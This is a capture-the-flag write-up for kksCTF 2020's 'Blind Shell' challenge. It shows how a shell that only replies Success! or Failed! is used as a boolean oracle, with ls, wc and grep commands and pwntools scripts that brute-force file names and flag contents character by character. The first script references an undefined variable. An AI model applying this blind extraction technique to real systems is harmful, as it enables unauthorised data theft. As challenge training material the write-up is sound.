# Blind Shell

- Category: misc  
- Points: 345  
- Solved by: 4cul, 01baf, crypt3d4ta

## Problem

It's simple enough, either you've succeeded or you've failed.  
Connect here: nc tasks.kksctf.ru 30010

## Writeup

In this challenge we are dealing with a particular shell.  
When we execute a command we have a fixed output which consists of  
"Success!" in case the execution is successful and "Failed!"  
on the other hand.

For example:

```  
$cat  
Success!  
$c  
Failed!  
```

The idea is to find files in the current directory, using the terminal output
to our advantage.  
With the aid of ls, wc, and grep, it’s possible to see inside the current
directory the number of files, and also their names

To see how much files are in the current directory we’ve run this piece of
commands:

```  
$ ls | wc -l | grep 1  
Failed!  
$ ls | wc -l | grep 2  
Failed!  
$ ls | wc -l | grep 3  
Success!  
```

And to see the name of each file:  
  
First we’ve looked with what letter each filename begins:

```  
$ ls | grep ^f | wc -l | grep 1  
Success!  
$ ls | grep ^v | wc -l | grep 1  
Failed!  
$ ls | grep ^m | wc -l | grep 1  
Success!  
$ ls | grep ^s | wc -l | grep 1  
Success!  
```

So there are 3 items into the directory, respectively beginning with ’f’, ‘m’
and ‘s’.  
  
Second, using this information, we’ve run the following commands, in order to
know their full names:

```  
$ ls | grep ^f  
Success!  
$ ls | grep ^fl  
Success!  
$ ls | grep ^fla  
Success!  
$ ls | grep ^flag\.t  
Success!  
$ ls | grep ^flag\.txt  
Success!  
```

The obtained files were:  
  
   - flag.txt: 	text file  
  
   - server.py: 	python script  
  
   - maybehere: 	directory

The same procedure is used to read from flag.txt:

```  
from pwn import *

alphabet =
'_0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}!"#()+,-/:;<=>?@[]^'

conn = remote('tasks.kksctf.ru', 30010)  
conn.sendline("cat flag.txt | grep ^L")  
conn.recvline()

read = 'L'

while True:  
   for i in alphabet:  
       test = read + i  
       print(test)  
       conn.sendline("cat flag.txt | grep " + test)  
       if chr(r[2]) == 'S':  
           read = test  
           break

print("Here's your content: ", read)  
```  
After launching the script we obtain:

```  
Look_around,maybe_here  
```

The suspect was that inside maybehere directory there was something
interesting;  
so we’ve tried to change the current directory into ./maybehere, but we’ve
noticed  
that ‘cd’ command actually doesn’t change directory - in fact, we’ve tried to
type ‘cd /’,  
but the current working directory remains the same, even if it returns
“Success!”.  
Again, thanks to the superpowers of ls, cat and grep, we’ve looked that into  
/maybehere there was the file flag.txt; so we’ve run the same script in order
to get its content,  
and we’ve finally discovered the flag

Script:

```  
from pwn import *

alphabet =
'_0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}!"#()+,-/:;<=>?@[]^'

conn = remote('tasks.kksctf.ru', 30010)  
conn.sendline("cat maybehere/flag.txt | grep kks{")  
conn.recvline()

flag = 'kks{'

while True:  
   for i in alphabet:  
       test = flag + i  
       print(test)  
       conn.sendline("cat maybehere/flag.txt | grep " + test)  
       r = conn.recvline()  
       print(r)  
       if chr(r[2]) == 'S':  
           flag = test  
           break

   if flag[-1] == '}':  
       break

print("Here's your flag: ", flag)  
```

### Flag  
```kks{Bl1nD_sH311_s2cKs_b4t_Y0U_ar3_amaz19g}```  

Original writeup
(https://github.com/r00tstici/writeups/tree/master/kksCTF_2020/Blind%20Shell).